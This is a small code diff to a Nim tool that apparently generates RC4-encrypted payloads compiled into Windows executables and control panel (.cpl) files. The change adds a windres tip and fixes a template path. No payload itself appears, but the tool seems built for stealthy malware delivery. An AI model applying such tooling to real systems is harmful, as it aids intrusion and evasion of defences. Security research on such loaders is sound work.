@@ -141,6 +141,7 @@ proc rc4Encrypt(): void =
         removeFile("resource.rc")
     else:
         stdout.styledWriteLine(fgRed, "[Failure] Could not compile resource file!")
+        echo "[Tip] Ensure x86_64-w64-mingw32-windres is in /usr/bin!"
         stdout.styledWriteLine(fgRed, rcCompileResults.output)
         quit(1)
 
@@ -210,7 +211,7 @@ proc generatePayload(): void =
             else :
                 compileCmd = "$1 c -d:mingw --mm:arc -d:useMalloc --opt:none --app=gui --cpu=amd64 -d:release -d:danger -d:strip -o=simpleexe.exe temp_simpleexe.nim" % [joinPath(getHomeDir(), ".nimble/bin/nim")]
         of "cpl":
-            templatePath = joinPath(templatePath, "simpledll.nim")
+            templatePath = joinPath(templatePath, "simplecpl.nim")
             try:
                 templateFile = templatePath.readFile()
             except IOError:
